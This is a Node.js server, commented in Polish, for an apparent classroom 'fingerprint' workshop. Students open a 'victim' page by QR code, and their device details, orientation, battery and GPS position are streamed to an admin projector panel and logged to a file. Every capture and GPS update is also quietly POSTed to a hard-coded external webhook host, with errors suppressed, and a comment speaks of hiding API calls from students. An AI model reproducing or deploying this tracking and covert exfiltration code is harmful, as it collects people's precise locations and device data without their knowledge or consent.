const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const os = require('os');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// ── Konfiguracja webhooka ──────────────────────────────────
const WEBHOOK_URL = 'http://6ysp8qv1jp.laravel-sail.site:8080/webhook/capture';
// ──────────────────────────────────────────────────────────

const CAPTURES_FILE = path.join(__dirname, 'captures.json');
let captures = [];
try { captures = JSON.parse(fs.readFileSync(CAPTURES_FILE, 'utf8')); } catch (_) {}

function saveCapture(data) {
  captures.push(data);
  fs.writeFile(CAPTURES_FILE, JSON.stringify(captures, null, 2), () => {});
}

function sendWebhook(payload) {
  if (!WEBHOOK_URL) return;
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-Source': 'workshop' },
    body: JSON.stringify({ source: 'workshop', ...payload }),
  }).catch(() => {});
}

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => res.redirect('/victim'));

// IP geolocation proxy — avoids CORS, hides API calls from student
app.get('/api/captures', (req, res) => res.json(captures));

app.get('/api/geoip', async (req, res) => {
  const raw = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const ip = raw.split(',')[0].trim().replace('::ffff:', '');
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,org,query`);
    const data = await r.json();
    res.json({ ...data, rawIp: ip });
  } catch {
    res.json({ status: 'fail', rawIp: ip });
  }
});

const victims = new Map();

io.on('connection', (socket) => {
  socket.on('join-admin', () => {
    socket.join('admins');
    // Send already-connected victims to new admin session
    victims.forEach((data, id) => socket.emit('victim-connected', { id, ...data }));
  });

  socket.on('victim-data', (data) => {
    const entry = { ...data, connectedAt: Date.now() };
    victims.set(socket.id, entry);
    io.to('admins').emit('victim-connected', { id: socket.id, ...entry });
    saveCapture({ id: socket.id, ...entry });
    io.to('admins').emit('new-capture', { id: socket.id, ...entry });
    sendWebhook({ event: 'device_info', id: socket.id, ...entry });
  });

  socket.on('victim-orientation', (data) => {
    if (!victims.has(socket.id)) return;
    victims.get(socket.id).orientation = data;
    io.to('admins').emit('victim-orientation', { id: socket.id, ...data });
  });

  socket.on('victim-battery', (data) => {
    if (!victims.has(socket.id)) return;
    victims.get(socket.id).battery = data;
    io.to('admins').emit('victim-battery', { id: socket.id, ...data });
  });

  socket.on('victim-gps', (data) => {
    if (!victims.has(socket.id)) return;
    victims.get(socket.id).gps = data;
    io.to('admins').emit('victim-gps', { id: socket.id, ...data });
    const entry = captures.findLast(c => c.id === socket.id);
    if (entry) { entry.gps = data; fs.writeFile(CAPTURES_FILE, JSON.stringify(captures, null, 2), () => {}); }
    sendWebhook({ event: 'gps', id: socket.id, ...data });
  });

  socket.on('disconnect', () => {
    if (victims.has(socket.id)) {
      victims.delete(socket.id);
      io.to('admins').emit('victim-disconnected', { id: socket.id });
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  const ips = Object.values(os.networkInterfaces())
    .flat()
    .filter(i => i.family === 'IPv4' && !i.internal)
    .map(i => i.address);

  console.log('\n╔══════════════════════════════════════════╗');
  console.log('║   WORKSHOP FINGERPRINT — serwer gotowy   ║');
  console.log('╚══════════════════════════════════════════╝\n');
  console.log('📱  Strona OFIARY (daj studentom / QR):');
  ips.forEach(ip => console.log(`    http://${ip}:${PORT}/victim`));
  console.log('\n🖥️   Panel ADMINA (rzutnik):');
  ips.forEach(ip => console.log(`    http://${ip}:${PORT}/admin`));
  console.log('\n📷  Generuj QR:');
  ips.forEach(ip => console.log(`    node generate-qr.js http://${ip}:${PORT}/victim`));
  console.log('\n⚠️   Uwaga: deviceorientation wymaga HTTPS na iOS Safari.');
  console.log('    Dla iPhone użyj: npx ngrok http ' + PORT);
  console.log('');
});
